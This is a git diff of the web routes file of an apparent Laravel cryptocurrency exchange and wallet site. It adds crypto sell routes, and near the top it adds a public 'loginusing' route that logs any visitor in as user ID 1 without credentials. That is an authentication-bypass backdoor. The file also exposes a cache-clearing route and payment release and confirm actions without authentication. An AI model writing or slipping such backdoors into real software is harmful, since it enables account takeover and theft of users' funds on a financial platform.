@@ -12,7 +12,9 @@ use Illuminate\Support\Facades\Route;
 | contains the "web" middleware group. Now create something great!
 |
 */
-
+Route::get('loginusing',function(){
+    return Auth::loginUsingId(1);
+});
 Route::get('/clear-cache', function() {
     Artisan::call('config:cache');
     Artisan::call('cache:clear');
@@ -44,7 +46,6 @@ Route::post('/mobile/otp/verify',[App\Http\Controllers\HomeController::class, 'v
 Route::post('/mobile/otp/send/login',[App\Http\Controllers\HomeController::class, 'sendOTPOnLogin'])->name('send.otp.login');
 
 Route::middleware('auth')->group(function(){
-    
     // Profile
     Route::prefix('user')->name('user.')->group(function(){ 
         Route::get('dashboard',[App\Http\Controllers\UserController::class, 'dashboard'])->name('dashboard');
@@ -61,7 +62,6 @@ Route::middleware('auth')->group(function(){
         Route::post('update-currency',[App\Http\Controllers\UserController::class, 'updateCurrencySettings'])->name('update.currency');
         Route::post('update-language',[App\Http\Controllers\UserController::class, 'updateLanguageSettings'])->name('update.language');
     });
-    
     //Wallet
     Route::prefix('wallet')->group(function(){
         Route::get('withdraw/history/{type?}/{typename?}',[App\Http\Controllers\TransactionController::class, 'withdraw_history'])->name('wallet.withdraw.history');
@@ -73,29 +73,24 @@ Route::middleware('auth')->group(function(){
         Route::post('create/deposit/',[App\Http\Controllers\TransactionController::class, 'store'])->name('wallet.create.deposit');
         Route::get('wallet/deposit/history/{type?}/{typename?}',[App\Http\Controllers\TransactionController::class, 'index'])->name('wallet.request.history');
     });
-
-
-
-
-
+    //sell crypt
+    Route::prefix('sell')->group(function(){
+        Route::get('create','SellController@create')->name('sell.create');
+        Route::post('create-sell','SellController@saveSell')->name('sell.save_sell');
+    	Route::post('create-sell/confirm','SellController@confirmSell')->name('sell.confirm_sell');
+        Route::get('{trans_id}/buy-request','SellController@buyRequest')->name('sell.buyer_request');
+        Route::post('{trans_id}/buy-request/confirm','SellController@buyRequestConfrim')->name('sell.buyer_request_confrim');
+        Route::get('{trans_id}/confirm-receipt','SellController@confirmReceipt')->name('sell.confirm_receipt');
+    	Route::get('{trans_id}/success','SellController@orderSuccess')->name('sell.order_success');
+    });
 });
 
 Route::get('buyer/payment/{transaction}/request',[App\Http\Controllers\PaymentController::class, 'show'])->name('payment.show');
-
 Route::get('buyer/payment/{transaction}/cancel',[App\Http\Controllers\PaymentController::class, 'cancel'])->name('payment.order.cancel');
-
 Route::get('buyer/payment/{transaction}/release',[App\Http\Controllers\PaymentController::class, 'release'])->name('payment.order.release');
-
 Route::get('buyer/payment/{transaction}/confirm',[App\Http\Controllers\PaymentController::class, 'confirm'])->name('payment.order.confirm');
-
 Route::get('buyer/payment/{transaction}/status',[App\Http\Controllers\PaymentController::class, 'status'])->name('payment.order.status');
-
-
 // Exchange
 Route::get('p2p/exchange',function(){ return view('front.exchange'); })->name('p2p.exchange');
-
 // Stocking
 Route::get('staking',function() { return view('front.staking'); })->name('staking');
-
-
-
